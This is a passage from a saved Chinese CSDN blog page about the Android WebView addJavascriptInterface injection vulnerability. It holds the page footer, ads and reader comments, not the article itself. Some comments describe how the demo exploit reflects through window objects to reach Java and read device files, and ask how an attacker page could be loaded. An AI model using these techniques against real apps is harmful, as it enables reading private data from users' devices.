+                    <div class="similar_wrap tracking-ad" data-mod="popu_141" style="max-height:195px;">
+                        <a href="http://blog.csdn.net/" style="display:none" target="_blank">http://blog.csdn.net</a>
+                        <ul class="similar_list fl"><li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/20538127" id="foot_aritcle_20538127undefined5671495517949017" target="_blank" title="Android tcpdump抓包应用实现">Android tcpdump抓包应用实现</a><span>2014-03-05</span><label><i>阅读</i><b>5139</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/18357567" id="foot_aritcle_18357567undefined7577577405684788" target="_blank" title="Android ColorDrawable那些事">Android ColorDrawable那些事</a><span>2014-01-16</span><label><i>阅读</i><b>11250</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/9407111" id="foot_aritcle_9407111undefined6139260210702895" target="_blank" title="Android java.lang.NoClassDefFoundError的一种解决方法">Android java.lang.NoClassDefFoundError的一种解决方法</a><span>2013-07-22</span><label><i>阅读</i><b>36878</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/9146643" id="foot_aritcle_9146643undefined3101413449278805" target="_blank" title="Android ListView不响应OnItemClickListener解决办法">Android ListView不响应OnItemClickListener解决办法</a><span>2013-06-21</span><label><i>阅读</i><b>13571</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/9137807" id="foot_aritcle_9137807undefined2970195343912376" target="_blank" title="用xdelta来制作差分文件">用xdelta来制作差分文件</a><span>2013-06-20</span><label><i>阅读</i><b>1824</b></label></li> </ul>
+
+                        <ul class="similar_list fr"><li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/18810509" id="foot_aritcle_18810509undefined9623108236630005" target="_blank" title="Anroid ListView分组和悬浮Header实现">Anroid ListView分组和悬浮Header实现</a><span>2014-01-27</span><label><i>阅读</i><b>33115</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/12567757" id="foot_aritcle_12567757undefined11774565669048687" target="_blank" title="Android 下拉刷新框架实现">Android 下拉刷新框架实现</a><span>2013-10-13</span><label><i>阅读</i><b>95146</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/9146811" id="foot_aritcle_9146811undefined12425930559533116" target="_blank" title="Android 使用Ant编译Android 工程">Android 使用Ant编译Android 工程</a><span>2013-06-21</span><label><i>阅读</i><b>3731</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/9137889" id="foot_aritcle_9137889undefined040724579161563135" target="_blank" title="强大的Doxygen工具使用手册">强大的Doxygen工具使用手册</a><span>2013-06-20</span><label><i>阅读</i><b>4148</b></label></li> <li><em>•</em><a href="http://blog.csdn.net/leehong2005/article/details/9130505" id="foot_aritcle_9130505undefined891966450916515" target="_blank" title="设计UI的基本思路">设计UI的基本思路</a><span>2013-06-19</span><label><i>阅读</i><b>1475</b></label></li> </ul>
+                    <a href="http://blog.csdn.net/leehong2005/article/category/1086396" class="MoreArticle">更多文章</a></div>
+                </div>
+            </div>    
+    <script type="text/javascript">
+        $(function () {
+            GetCategoryArticles('1086396', 'leehong2005','foot','11808557');
+        });
+    </script>
+      
+</div>
+<div id="suggest">
+
+</div>
+         <script language="javascript" type="text/javascript">     
+             $(function(){
+                 $.get("/leehong2005/svc/GetSuggestContent/11808557",function(data){
+                     $("#suggest").html(data);
+                 });     
+             });             
+         </script>  
+
+
+<style>
+.blog-ass-articl dd {
+color: #369;
+width: 99%; /*修改行*/
+float: left;
+overflow: hidden;
+font: normal normal 12px/23px "SimSun";
+height: 23px;
+margin: 0;
+padding: 0 0 0 10px;
+margin-right: 30px;
+background: url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;
+}
+</style>
+
+ <link rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/replace.css">
+
+<div id="relate" data-mod="popu_218" class="tracking-ad">
+        <div class="relate_t">
+            <h3><span>参考知识库</span></h3>
+        </div>
+        <div class="relate_c">
+        </div>
+</div>
+ 
+
+<dl class="blog-ass-articl" id="res-relatived"> 
+    <div class="embody embody_b" id="libkeyparent" style="display:none">
+            <span class="embody_t">更多资料请参考：</span>
+            <div class="embody_c" id="libkey"></div>
+    </div>
+
+
+     <dt><span>猜你在找</span></dt>    
+
+
+   
+
+
+    <div id="adCollege" style="width: 42%;float: left;"> 
+        <script src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/job_reco.js" type="text/javascript"></script> 
+        <script type="text/javascript">
+            csdn.position.showEdu({
+                sourceType: "blog",
+                searchType: "detail",
+                searchKey: "11808557",
+                username: "",
+                recordcount: "5",
+                containerId: "adCollege" //容器DIV的id。 
+            });
+        </script> 
+    <div class="tracking-ad" data-mod="popu_84"><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px; white-space: nowrap;"><a href="http://edu.csdn.net/course/detail/463" title="HTML 5视频教程系列之JavaScript学习篇" strategy="v4:content" target="_blank">HTML 5视频教程系列之JavaScript学习篇</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px; white-space: nowrap;"><a href="http://edu.csdn.net/course/detail/2272" title="javaScript-高级面向对象视频教程" strategy="v4:content" target="_blank">javaScript-高级面向对象视频教程</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px; white-space: nowrap;"><a href="http://edu.csdn.net/course/detail/738" title="JavaScript精品课" strategy="v4:content" target="_blank">JavaScript精品课</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px; white-space: nowrap;"><a href="http://edu.csdn.net/course/detail/2551" title="2016年新课程的第一阶段javascript+jquery课程" strategy="v4:content" target="_blank">2016年新课程的第一阶段javascript+jquery课程</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px; white-space: nowrap;"><a href="http://edu.csdn.net/course/detail/812" title="JavaScript DOM编程" strategy="v4:content" target="_blank">JavaScript DOM编程</a></dd></div></div>  
+
+    
+     <div id="res" data-mod="popu_36" class="tracking-ad" style="width: 42%; float: left; margin-right: 30px; display: block;"><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/cl1771066100/article/details/49403789" title="Android WebView的Js对象注入漏洞解决方案" strategy="SearchAlgorithm" target="_blank">Android WebView的Js对象注入漏洞解决方案</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/jdsjlzx/article/details/50633847" title="Android WebView的Js对象注入漏洞解决方案" strategy="SearchAlgorithm" target="_blank">Android WebView的Js对象注入漏洞解决方案</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/clh604/article/details/18424737" title="Android WebView的Js对象注入漏洞解决方案" strategy="SearchAlgorithm" target="_blank">Android WebView的Js对象注入漏洞解决方案</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/niansiqiao/article/details/43968657" title="Android WebView的Js对象注入漏洞解决方案" strategy="SearchAlgorithm" target="_blank">Android WebView的Js对象注入漏洞解决方案</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/nbalichaoq/article/details/50952838" title="Android WebView的Js对象注入漏洞解决方案" strategy="SearchAlgorithm" target="_blank">Android WebView的Js对象注入漏洞解决方案</a></dd></div>
+   
+</dl>
+
+
+<script type="text/javascript">
+    $(function () {
+        setTimeout(function () {
+            var searchtitletags = 'Android WebView的Js对象注入漏洞解决方案' + ',' + $("#tags").html();
+            searchService({
+                index: 'blog',
+                query: searchtitletags,
+                from: 5,
+                size: 5,
+                appendTo: '#res',
+                url: 'recommend',
+                his: 2,
+                client: "blog_cf_enhance",
+                tmpl: '<dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="#{ url }" title="#{ title }" strategy="#{ strategy }">#{ title }</a></dd>'
+            });
+        }, 500);
+    });    
+
+ </script>  
+
+    <div id="ad_cen">        
+<!-- 广告位开始 -->
+<div class="J_adv" data-view="true" data-mod="ad_popu_71" data-mtp="36" data-order="40" data-con="ad_content_216" style="width: 728px; height: 90px;"><!-- 广告占位容器 --><div id="cpro_u1607657"><iframe id="iframeu1607657_0" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/ocwm(1).html" width="728" height="90" align="center,center" vspace="0" hspace="0" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" style="border:0; vertical-align:bottom;margin:0;" allowtransparency="true"></iframe></div><!-- 投放代码 --><script type="text/javascript">(window['cproStyleApi'] = window['cproStyleApi'] ||{})['u1607657']={at:'3',rsi0:'728',rsi1:'90',pat:'6',tn:'baiduCustNativeAD',rss1:'#FFFFFF',conBW:'1',adp:'1',ptt:'0',titFF:'%E5%BE%AE%E8%BD%AF%E9%9B%85%E9%BB%91',titFS:'',rss2:'#000000',titSU:'0',ptbg:'90',piw:'0',pih:'0',ptp:'0'};/*服务器频道首页置顶Banner960*90，创建于2014-7-3*/(window.cproArray = window.cproArray || []).push({id:'u1607657'});  </script>  <script src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/c.js" type="text/javascript"></script></div>
+<!-- 广告位结束 -->    </div>  
+
+<div class="comment_class">
+    <div id="comment_title" class="panel_head">
+        <span class="see_comment">查看评论</span><a name="comments"></a></div>
+    <div id="comment_list"><dl class="comment_item comment_topic" id="comment_item_5969205"><dt class="comment_head" floor="17">17楼 <span class="user"><a class="username" href="http://blog.csdn.net/shakespeare001" target="_blank">山代王</a> <span class="ptime">2016-04-04 11:40发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="5969205" username="shakespeare001"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/shakespeare001" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_shakespeare001.jpg" width="40" height="40"></a></dd><dd class="comment_body">感谢分享，正需要这方面的知识</dd></dl><dl class="comment_item comment_topic" id="comment_item_5854183"><dt class="comment_head" floor="16">16楼 <span class="user"><a class="username" href="http://blog.csdn.net/cherishxmz" target="_blank">cherishxmz</a> <span class="ptime">2016-01-25 15:04发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="5854183" username="cherishxmz"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/cherishxmz" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_cherishxmz.jpg" width="40" height="40"></a></dd><dd class="comment_body"><fieldset><legend>引用“chmlqw”的评论：</legend>LZ你好， 我测试execute函数中var obj in window， 枚举窗口时，找不到get...</fieldset><br>我也是啊</dd></dl><dl class="comment_item comment_topic" id="comment_item_5854077"><dt class="comment_head" floor="15">15楼 <span class="user"><a class="username" href="http://blog.csdn.net/cherishxmz" target="_blank">cherishxmz</a> <span class="ptime">2016-01-25 14:05发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="5854077" username="cherishxmz"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/cherishxmz" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_cherishxmz.jpg" width="40" height="40"></a></dd><dd class="comment_body"><fieldset><legend>引用“chmlqw”的评论：</legend>LZ你好， 我测试execute函数中var obj in window， 枚举窗口时，找不到get...</fieldset></dd></dl><dl class="comment_item comment_topic" id="comment_item_5422117"><dt class="comment_head" floor="14">14楼 <span class="user"><a class="username" href="http://blog.csdn.net/ddccff123" target="_blank">dongcfang</a> <span class="ptime">2015-09-18 16:38发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="5422117" username="ddccff123"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/ddccff123" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_ddccff123.jpg" width="40" height="40"></a></dd><dd class="comment_body">楼主你好我用的的是demo中的WebViewEx.java<br>然后用testin安全扫描，出现下面的<br>WebViewEx.java|void addJavascriptInterface(Object paramObject, String paramString)|super.addJavascriptInterface(paramObject, paramString);<br>用腾讯的金刚系统审计报告<br>WebViewEx.java|void addJavascriptInterface(Object paramObject, String paramString)|super.addJavascriptInterface(paramObject, paramString);<br>也会出现这种问题，请问是安全测试平台的问题吗？</dd></dl><dl class="comment_item comment_topic" id="comment_item_5193551"><dt class="comment_head" floor="13">13楼 <span class="user"><a class="username" href="http://blog.csdn.net/luqing414" target="_blank">luqing414</a> <span class="ptime">2015-07-09 14:05发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="5193551" username="luqing414"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/luqing414" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_luqing414.jpg" width="40" height="40"></a></dd><dd class="comment_body">我有两个疑问：第一，getContents和execute方法会导致安全性的问题，但这两个方法是你自己加到你的html页面中的，如果你自己不加的话，别人有办法加到你的html页面中来吗，通过什么途径？<br>第二：我手机是Android4.2.2的系统，但运行的时候，还是把我手机里的文件目录读取出来了，我把代码中的hasJellyBeanMR1方法直接返回false才正常，所以4.2后的版本，虽然加了@JavascriptInterface，但如果你自己的html中有恶意代码的话，还是会执行的吧</dd><dl class="comment_item comment_reply" id="comment_item_5344139"><dt class="comment_head" floor="13">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2015-08-26 18:23发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="5344139" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复luqing414：1、比如你的应用是一个浏览器或者是一个平台级的产品（微信，手机百度等），在某情况下是需要加载第三方的页面的，所以就存在一些问题。<br>2、4.2以后是google把这样的漏洞补上了，是会执行，但是你不能通过window拿到对象，也就不能去反射得到实例。<br><br>~~~没细想</dd></dl></dl><dl class="comment_item comment_topic" id="comment_item_4819409"><dt class="comment_head" floor="12">12楼 <span class="user"><a class="username" href="http://blog.csdn.net/nenjianger" target="_blank">nenjianger</a> <span class="ptime">2015-03-02 15:28发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4819409" username="nenjianger"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/nenjianger" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_nenjianger.jpg" width="40" height="40"></a></dd><dd class="comment_body">存在注入不成功的情况啊，加载本地的文件没问题，加载网络的文件就失败了</dd></dl><dl class="comment_item comment_topic" id="comment_item_4610077"><dt class="comment_head" floor="11">11楼 <span class="user"><a class="username" href="http://blog.csdn.net/paradiseccc" target="_blank">paradiseccc</a> <span class="ptime">2014-12-15 10:57发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4610077" username="paradiseccc"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/paradiseccc" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_paradiseccc.jpg" width="40" height="40"></a></dd><dd class="comment_body">如果想要利用某个应用的addJavaScriptInterface漏洞，必须要用file协议让它访问本地的某个网页？比如文中的：<br>mWebView.loadUrl("file:///android_asset/html/test.html"); <br><br>如果这个应用中没有定义这样的loadUri方法，要怎么让它调用自己写的test.html呢？</dd></dl><dl class="comment_item comment_topic" id="comment_item_4515917"><dt class="comment_head" floor="10">10楼 <span class="user"><a class="username" href="http://blog.csdn.net/chenchendf" target="_blank">一天十小时</a> <span class="ptime">2014-11-14 14:19发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4515917" username="chenchendf"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/chenchendf" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_chenchendf.jpg" width="40" height="40"></a></dd><dd class="comment_body">最后提示的源代码下载，下载出来的压缩文件已经损坏</dd></dl><dl class="comment_item comment_topic" id="comment_item_4261541"><dt class="comment_head" floor="9">9楼 <span class="user"><a class="username" href="http://blog.csdn.net/chmlqw" target="_blank">chmlqw</a> <span class="ptime">2014-09-09 15:03发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4261541" username="chmlqw"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/chmlqw" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_chmlqw.jpg" width="40" height="40"></a></dd><dd class="comment_body">LZ你好， 我测试execute函数中var obj in window， 枚举窗口时，找不到getclass呢，所以后续的都无法执行。android4.0.4和android 2.3都是测试了</dd><dl class="comment_item comment_reply" id="comment_item_5854184"><dt class="comment_head" floor="9">Re: <span class="user"><a class="username" href="http://blog.csdn.net/cherishxmz" target="_blank">cherishxmz</a> <span class="ptime">2016-01-25 15:05发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="5854184" username="cherishxmz"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/cherishxmz" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_cherishxmz.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复chmlqw：我也是啊 你解决了吗</dd></dl></dl><dl class="comment_item comment_topic" id="comment_item_4026313"><dt class="comment_head" floor="8">8楼 <span class="user"><a class="username" href="http://blog.csdn.net/yanyuetian007" target="_blank">yanyuetian007</a> <span class="ptime">2014-07-07 19:12发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4026313" username="yanyuetian007"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/yanyuetian007" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_yanyuetian007.jpg" width="40" height="40"></a></dd><dd class="comment_body">其实楼主说得稍有点模糊， 这篇文章http://www.pedant.cn/2014/07/04/webview-js-java-interface-research/ 对java js相互调用有更深入的分析， 包装更简单的接口使用</dd><dl class="comment_item comment_reply" id="comment_item_4425471"><dt class="comment_head" floor="8">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2014-10-22 18:35发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4425471" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复yanyuetian007：看了这个文章，里面一些细节有问题，比如加载到20%再注入，这个肯定不能覆盖到所有的情况。</dd><dl class="comment_item comment_reply" id="comment_item_4582585"><dt class="comment_head" floor="1">Re: <span class="user"><a class="username" href="http://blog.csdn.net/yanyuetian007" target="_blank">yanyuetian007</a> <span class="ptime">2014-12-04 10:51发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4582585" username="yanyuetian007"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/yanyuetian007" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_yanyuetian007.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复leehong2005：加载到25%再注入的确是能覆盖到所有情况的，这个数字是我在实际上做了大量测试得到，并且框架已应用到各个线上版本（覆盖很多设备）长期都没有出现注入不成功的问题。文章中也讲了小于25%时webkit加载页面的初始工作可能未就绪，导致这时注入无效。另一方面在快完成时注入，比如70-80%，就会引起页面初始发起的调用（文章末尾的情形）等待过久时间。</dd><dl class="comment_item comment_reply" id="comment_item_4796787"><dt class="comment_head" floor="1">Re: <span class="user"><a class="username" href="http://blog.csdn.net/leehong2005" target="_blank">leehong2005</a> <span class="ptime">2015-02-13 14:43发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="4796787" username="leehong2005"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/leehong2005" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_leehong2005.jpg" width="40" height="40"></a></dd><dd class="comment_body">回复yanyuetian007：不否认25%这个点是正确的，但这个数字我的理解是一个经验值，而这个值的得到相信你也是做了大量的实验，但既然是经验值，又怎么能完全保证100%没有问题呢。所以说，我觉得多个时机点注入与经验值相总结，这样的话应该是安全的。<br>另外，应用到产品线后，还得看产品线的用户量，日活等，这几个指标越大越能证明经验值是否可靠。</dd></dl></dl></dl></dl><dl class="comment_item comment_topic" id="comment_item_3821645"><dt class="comment_head" floor="7">7楼 <span class="user"><a class="username" href="http://blog.csdn.net/quzishen" target="_blank">quzishen</a> <span class="ptime">2014-05-08 09:27发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3821645" username="quzishen"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/quzishen" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_quzishen.jpg" width="40" height="40"></a></dd><dd class="comment_body">感谢楼主分享<br>同时分享我的结论给您，希望您多提意见<br>http://windvane.m.taobao.com/windvane.htm</dd></dl><dl class="comment_item comment_topic" id="comment_item_3645019"><dt class="comment_head" floor="6">6楼 <span class="user"><a class="username" href="http://blog.csdn.net/json20080301" target="_blank">json20080301</a> <span class="ptime">2014-03-25 12:55发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3645019" username="json20080301"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/json20080301" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_json20080301.jpg" width="40" height="40"></a></dd><dd class="comment_body">写的不错。phonegap就是hack onJsPrompt方法来实现webView功能的扩展的。</dd></dl><dl class="comment_item comment_topic" id="comment_item_3300657"><dt class="comment_head" floor="5">5楼 <span class="user"><a class="username" href="http://blog.csdn.net/A328240784" target="_blank">追风筝的孩子</a> <span class="ptime">2013-12-17 18:02发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3300657" username="A328240784"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#quote" class="cmt_btn quote" title="引用">[引用]</a> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" class="cmt_btn report" title="举报">[举报]</a></span></span></dt><dd class="comment_userface"><a href="http://blog.csdn.net/A328240784" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/3_a328240784.jpg" width="40" height="40"></a></dd><dd class="comment_body"><fieldset><legend>引用“leehong2005”的评论：</legend>回复A328240784：没有明白你的意思？那段是指哪一段？</fieldset><br>3，漏洞证明 第一段js</dd></dl><dl class="comment_item comment_topic" id="comment_item_3300581"><dt class="comment_head" floor="4">4楼 <span class="user"><a class="username" href="http://blog.csdn.net/A328240784" target="_blank">追风筝的孩子</a> <span class="ptime">2013-12-17 17:46发表</span>  <a href="http://blog.csdn.net/leehong2005/article/details/11808557#reply" class="cmt_btn reply" title="回复">[回复]</a> <span class="comment_manage" style="display:none;" commentid="3300581" username="A328240784"> 